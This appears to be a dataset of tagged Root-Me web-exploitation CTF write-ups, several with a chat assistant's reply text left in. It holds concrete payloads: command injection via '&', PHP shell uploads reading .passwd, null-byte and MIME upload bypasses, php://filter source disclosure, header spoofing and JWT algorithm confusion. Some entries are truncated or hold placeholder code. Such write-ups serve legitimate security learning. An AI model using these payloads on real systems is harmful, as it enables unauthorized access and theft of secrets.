<!--
Je crois que c'est vraiment trop simple la !
password : xxx
-->
"
"02_HTTP_IP_restriction_bypass_tagged.txt","Web Exploitation","Title: Bypassing IP Filtering with HTTP Headers Injection
Primary topic: Web Exploitation
Secondary topic: HTTP Headers Injection
Tools used: cURL
Keywords: IP filtering, load-balancer, proxy

#overview
Only local users will be able to access the page

---

#analysis
In this challenge we will study the bypassing of IP filtering by a well-known technique of HTTP headers injection. Some of these headers allow you to specify that the clients IP address is different from the source IP address in the packet received by the server. These headers are particularly useful when the connections go through a load-balancer or a proxy. However we can also use these headers to indicate the IP we want. 

#attack_execution
So we will try request with CURL and this HTTP header!

#code
curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.1.1'

#exploitation
And we get :

Well done validation password is : <strong>FLAGFLAGFLAGFLAGFLAGFLAG</strong>

---

#countermeasures
To prevent HTTP headers injection attacks, it's important to sanitize and validate all user input, including HTTP headers. Additionally, web application firewalls (WAFs) can be used to detect and block malicious requests that contain suspicious headers."
"03_HTTP_Open_redirect_tagged.txt","Web Exploitation","Title: None
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Tamper Data, Online MD5 hash converter
Keywords: md5 hash, redirect, tampering

#context
Check source code. You can see that when an option is selected, you are redirected to, for example, https://facebook.com&h=......&#8230;.

#discovery
We need to figure out what the value followed by &h= is, so we can structure our redirect url accordingly. Using an online md5 hash to text converter, we see the value represents the hashed value of the particular url. MD5 hash https://google.com&#8217; and note the value.

#exploitation
Start tamper data and click the facebook link. Edit the url so the website redirects to ?url=https://google.com&h=<MD5hash of https://google.com>&#8217; instead of facebook. Then submit the page.

#code
None

#countermeasures
None"
"04_HTTP_User-agent_tagged.txt","Web Exploitation","Thank you for providing the writeup text. Here is the tagged version of the writeup:

```
Title: None
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: user-agent

#exploitation
User tamper data to change the user-agent from its original value to admin.
```

Please let me know if you have any further questions or if you'd like me to tag any other writeups."
"05_Weak_password_tagged.txt","Web Exploitation","Here's the tagged version of the writeup text you provided:

```
Title: Guessing Credentials
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: credentials, guessing

#exploitation
Guess the credentials. After guessing, the credentials end up being:
username: admin password: admin
The password to complete the level is admin.
```

Please let me know if this meets your requirements."
"06_PHP_Command_injection_tagged.txt","Web Exploitation","Title: Command Injection via IP Address Field
Primary topic: Web Exploitation
Secondary topic: Command Injection
Tools used: None
Keywords: IP addresses, shell command, sanitization, index.php, cat, grep

#context
The first thing we see is a text field that accepts IP addresses, pings them, and returns the output as if it was a shell command.

#discovery
Seeing the output look like it came from a unix shell, trying to put commands such as ls sounds like a good idea, but there seems to be some sanitization. To get around this, you can put in an IP address, along with another command using the & symbol.

#exploitation
In the description of the challenge, it says the flag is in the index.php file, but if you look at the source code of the page, theres nothing there. Assuming that file is on the compromised service, we can inject a command to cat the file, and grep for the flag. The command I used was: 127.0.0.1 & cat index.php | grep flag

#code
`127.0.0.1 & cat index.php | grep flag`

#countermeasures
None provided."
"07_Backup_file_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Vim Backup File Password Retrieval
Primary topic: Web Exploitation
Secondary topic: Improper Input Sanitization
Tools used: None
Keywords: vim, backup files

#context
This one is a bit trickier. You are given a username and password field, but the intended solution doesnt include any improper text sanitization.

#discovery
If you are a vim god, you would know that vim backup files are stored as the original name of the file, with a tilde character at the end of the filename.

#exploitation
Knowing this, just navigate to /index.php~, and download the file. There, you will find the password.

#countermeasures
None
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"08_HTTP_Directory_indexing_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Password Directory Subdirectory Trick
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: password, subdirectory

#context
This challenge provides you with the supposed directory for the password in the source code of the page. However, if you visit the page, theres nothing there.

#discovery
If you go back and pay closer attention to the directory they gave you, it turns out to be a subdirectory, with the root directory being /admin. Navigate to /admin and youll be able to see more files.

#exploitation
The password should be in /admin/backup/admin.txt.

#countermeasures
None
```"
"09_HTTP_Headers_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Changing HTTP Headers
Primary topic: Web Exploitation
Secondary topic: HTTP Headers
Tools used: cURL
Keywords: headers

#context
From the challenge name, we assume that it has something to do with the headers.

#discovery
To get the headers of the web page, we can use a curl command:
curl --head http://challenge01.root-me.org/web-serveur/ch5/

#exploitation
Now we know what the headers are, we can change them using the curl command:
curl --include --header ""Header-RootMe-Admin: Administrator"" http://challenge01.root-me.org/web-serveur/ch5/

#countermeasures
None

#code
None
```"
"10_HTTP_POST_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Bypassing Score Validation in a Web Game
Primary topic: Web Exploitation
Secondary topic: POST Request
Tools used: cURL
Keywords: POST request, score validation

#context
With this challenge, we are greeted with a fun little game that generates a random number every time you click the button.

#discovery
After seeing the source code, we see that the button sends a POST request with two values: generate and score.

#exploitation
We can use cURL to send a POST request with a score over 999999 (If you send a POST request with just a score parameter, it wont work, make sure to include the generate value as well). We can use the cURL command:
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/

#code
curl --request POST --form 'generate=Give+a+try%21' --form 'score=1000000' http://challenge01.root-me.org/web-serveur/ch56/
```

I hope this meets your requirements. Let me know if you have any further questions or concerns."
"11_HTTP_Improper_redirect_tagged.txt","Web Exploitation","Title: Bypassing Authentication with URI Manipulation
Primary topic: Web Exploitation
Secondary topic: Authentication Bypass
Tools used: Burp Suite, ZAP proxy, cURL
Keywords: URI manipulation, intercepting server responses

#context
We start the challenge with a login portal that says were not authenticated and cant view this page (take note of the URI).

#discovery
If you change the URI to contain index.php, it will quickly go to that page, and redirect back to the one we started at. You can use burp suite, ZAP proxy, or curl to capture the request. I used the curl command:
curl ""http://challenge01.root-me.org/web-serveur/ch32/index.php""

#discovery
If you want to do the challenge properly, you can use burp suite or any other program that intercepts server responses. When in burp suite, go the proxy tab, and then options tab, and enable Intercept Server Responses (this is off by default).

#exploitation
Then, turn on intercept and request the same webpage as we did in the curl command above. Forward the requests until you get a response, it should be an HTTP 302 Found response. Change the code to 200 OK and forward the response to your browser, you should get a web page with the flag.

#code
None

#countermeasures
None"
"12_HTTP_Verb_tampering_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: HTTP Verb Tampering
Primary topic: Web Exploitation
Secondary topic: Input Validation
Tools used: cURL
Keywords: HTTP methods, credentials

#context
When visiting the web page for this challenge, we are asked for credentials.

#exploitation
However, the intended solution for this challenge is not to manipulate input sanitization, but to tamper with different HTTP methods, called verb tampering.

#discovery
We can use curl commands to request the web page with different verbs, and find the password. We can use this curl command to get the password (other verbs also yield the same result).
curl --request PUT http://challenge01.root-me.org/web-serveur/ch8/

#code
curl --request PUT http://challenge01.root-me.org/web-serveur/ch8/

#countermeasures
```

Please let me know if you have any questions or if there's anything else I can help you with."
"13_Install_files_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Blank HTML Page
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: phpbb, install file

#context
We start with a blank and empty HTML page.

#context
Looking at the description of the challenge hints at the use of the phpbb software.

#discovery
Looking at the documentation of the software, we see that an install file is in the directory phpbb/install/install.php.

#exploitation
Go to this directory and you will get the password.

#code
None

#countermeasures
None
```"
"15_File_upload_Double_extensions_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: PHP Shell Upload
Primary topic: Web Exploitation
Secondary topic: File Upload
Tools used: None
Keywords: php, file extension, command injection

#context
Referring to the documentation provided along with this challenge, I wrote a quick php script and saved it as php_shell.php.jpg.

#exploitation
Sometimes you can trick the web server into accepting your php file by adding an acceptable file extension (jpg, png, gif) to the end of the php file extension. After uploading the file, we navigate to it and inject our command into the url. .....php_shell.php.jpg?command=cat ../../../.passwd

#code
None

#countermeasures
None
```

Please let me know if you have any questions or if there's anything else I can help you with."
"16_File_upload_MIME_type_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Uploading PHP Shell Script as JPEG
Primary topic: Web Exploitation
Secondary topic: File Upload Vulnerability
Tools used: Burp Suite
Keywords: content-type, injection

#context
For this challenge, we use burp to capture the post request sent to the server when trying to upload our php shell script and change the content-type from application/x-php to image/jpeg. This will trick the server into accepting the upload, thinking its a jpg file.

#exploitation
Click icon on our file and, like before, inject our command into the url:
http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/gsejso5erm5ahvm8i561a9tdh7//shell.php?command=cat%20../../../.passwd

#code
cat ../../../.passwd
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"17_HTTP_Cookies_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Solving a Web Server Challenge
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Firefox, Live HTTP Headers
Keywords: cookie, admin access

#context
This challenge really irritated me because it took me 3 different plugins to find one that would work. Once I did, solving the challenge is a no-brainer.

#discovery
Click on saved email addresses, we get an error that says we must be admin. Checking the url: http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur. But simply replacing visiteur with admin we get an error that says theres an issue with the cookie value.

#discovery
Install the firefox plugin Live HTTP Headers and click the Saved email addresses link again. In live http headers, you can see the cookie: ch7=visiteur.

#exploitation
Click replay and change visiteur to admin, then replay again. In the browser click the link once more to find the validation password.

#countermeasures
None

#code
None
```"
"18_Insecure_Code_Management_tagged.txt","Web Exploitation","Title: Git Version Control and Sensitive Information Exposure
Primary topic: Web Exploitation
Secondary topic: Git Version Control
Tools used: wget, HTTrack, git, gittyleaks
Keywords: API keys, passwords, hard-coded, .git directories, commits, MD5 hash, config.php file

#context
Insecure code management is when part of the code exposes sensitive information which shouldnt be exposed to the world. Here we will cover the part of Git version control feature and how attackers can gain sensitive information if it is exposed in .git directories of the webservers.

#context
This Challenge will present you with a web-App. There is not much information on the first page and it will ask you to enter login information.

#discovery
A quick check will give you /.git. You can use wget or HTTrack to download the files and sub-directories. Once downloaded, go to the .git directory and check the git log, that will give you information on the commits that has happened and gives you a history of the changes that has been done to the repository.

#discovery
Now, we know changes has been made on the passwords and also that the password is in MD5 hash. Lets check the change status by using command : git status. The file config.php and index.php are the once that are deleted. Mostly when setting up a webApp, the DB passwords and the application passwords are stored in the config.php file. What we need to do now is to either restore this file or to checkout these files.

#exploitation
The next command I have used is : git restore config.php which gave me the required password. The above hash can be checked against MD5 decryptor and we can get the relevant string.

#code
`git restore config.php`

#countermeasures
The above approach is a manual one can be automated with plenty of tools out there. But the one I found pretty useful in such scenarios is gittyleaks. To make use of this tool, all you require"
"20_Directory_traversal_tagged.txt","Web Exploitation","Title: Hidden Folder and Password Retrieval
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: galerie, hidden folder, password retrieval

#context
We have a URL that displays different categories using the parameter 'galerie'. The URL is http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes.

#discovery
We can deduce that 'galerie' holds all the files. Navigating to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=, we can see a hidden folder beginning with '86hv'. 

#discovery
To get the full folder name, move your mouse above the icon and right-click, then select 'inspect element'. 

#discovery
Navigate to http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r, and you'll see a file named 'password.txt'. 

#exploitation
Right-click and view the source code. Click the 'password.txt' hyperlink for the password. 

#code
None

#countermeasures
This challenge highlights the importance of proper access control and directory traversal protection to prevent unauthorized access to sensitive files."
"21_File_upload_Null_byte_tagged.txt","Web Exploitation","Here's the tagged version of the writeup text you provided:

```
Title: Renaming a Shell to Bypass File Upload Restrictions
Primary topic: Web Exploitation
Secondary topic: File Upload Restrictions
Tools used: None
Keywords: nullbyte

#context
Passing this level is super easy. Use the same shell as before.

#exploitation
Say the file name of your shell is shell.php. Rename it to shell.php%00.jpg. When submitted, the .jpg file extension will be dropped due to the preceding nullbyte. Once the file has uploaded, click it.

#countermeasures
This challenge demonstrates the importance of properly validating file extensions and content types during file uploads. Developers should also consider implementing additional security measures, such as file size limits and virus scanning, to prevent malicious files from being uploaded to their web applications.
```"
"26_PHP_Filters_tagged.txt","Web Exploitation","Title: PHP Filters for Input Validation
Primary topic: Web Exploitation
Secondary topic: PHP Filters
Tools used: None
Keywords: input validation, sanitize, filters, base64 encoding

#context
PHP filters are used to validate and sanitize external input. There are a number of filters that can be applied.

#exploitation
One built-in filter is convert.base64-encode and convert.base64-decode, the former of which will be used in this exploit. It will go like php://filter/convert.base64-encode. php://filter/convert.base64-encode/resource allows us to read any source of a PHP file. It forces PHP to base64 encode the file before it is used in the require statement. From there, decoding the base64 string will give us the source code for whichever PHP file is called by parameter resource. We continue guessing helpful PHP files such as config.php.

#code
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php

#countermeasures
It's important to use input validation and sanitization techniques to prevent attacks like this. Developers should be aware of the available filters and use them appropriately to ensure the security of their web applications."
"27_PHP_register_globals_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Backup File Disclosure
Primary topic: Web Exploitation
Secondary topic: Backup File Disclosure
Tools used: None
Keywords: backup files

#context
It seems that the developer often leaves backup files around.

#exploitation
Bypass with PHP register globals ?_SESSION[logged]=1
http://challenge01.root-me.org/web-serveur/ch17?_SESSION[logged]=1
well done, you can validate with the password.

#countermeasures
None
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"30_File_upload_ZIP_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Zip File Upload Vulnerability
Primary topic: Web Exploitation
Secondary topic: File Upload
Tools used: Kali Linux, zip command

#context
There is a zip file upload.

#discovery
I wrote a .php file, compressed to .zip file, uploaded.

#countermeasures
Report 403 code, because the php file cannot be accessed, only txt/jpg can be.

#exploitation
Create a soft link in kali to a .txt file, and then use the zip command compression symbol link file. Uploaded.

#discovery
Found that the .txt file is larger in size, clicking on the .txt file we'll get the index.php code.
```

I hope this meets your requirements. Let me know if you have any further questions or concerns."
"33_JSON_Web_Token_(JWT)_Public key_tagged.txt","Web Exploitation","Title: Accessing /admin endpoint with JWT Attack
Primary topic: Web Exploitation
Secondary topic: JWT Attack
Tools used: Python

#context
You find an API with 3 endpoints:
/key (accessible with GET)
/auth (accessible with POST)
/admin (accessible with POST)

#discovery
There is sure to be important data in the /admin endpoint, I have to access it.
I get a public key in the /key endpoint and I bring it to the human format.
I get the JWT in the /auth endpoint.

#exploitation
After reading a little, I came to the conclusion that it is necessary to send a token signed by the received public key (alg: RSA) while the server is waiting for a token with the signature HMAC (HS256/HS512).
The HS256 algorithm uses the secret key (Secret Key) to sign and authenticate the token's Header and Payload.
If the signature algorithm is changed from RS256 to HS256, On the authentication server, use the public key (Public Key) as the secret key (Secret Key) and use the HS256 algorithm to confirm the signature. In these cases, the attacker gets the public key (Public Key) to sign the token and verify the signature with the HS256 algorithm to make a JWT Attack.
Thanks to this, the server will automatically accept my token, I try to create and sign a token in python.
I get the token which I need to send.
I send the signed token.

#code
[Python code to create and sign the token]
"
"34_Local_File_Inclusion_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: LFI to Find Admin Page
Primary topic: Web Exploitation
Secondary topic: Local File Inclusion
Tools used: None
Keywords: admin page, directory listing, file viewer, string search

#context
We must search admin page/directory via LFI (Local file Inclusion).
http://challenge01.root-me.org/web-serveur/ch16/?files=..//

#discovery
The directory is listing our admin directory, now view the content of file index.php with File viewer.
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php

#exploitation
Search for this string: 
$users = array('admin' => 'OpbNJ60xYpvAQU8');

#code
$users = array('admin' => 'OpbNJ60xYpvAQU8');
 
#countermeasures
None mentioned in the writeup.
```"
"68_SQL_injection_Time_based_tagged.txt","Web Exploitation","Title: SQL injection - Time based
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: SQLMap
Keywords: None

#discovery
Load the URL in SQLMap.

#discovery
Then find the current db.
Find the tables from DB public.
Get the columns from users table.

#exploitation
Let's dump it! Flag gained.
"
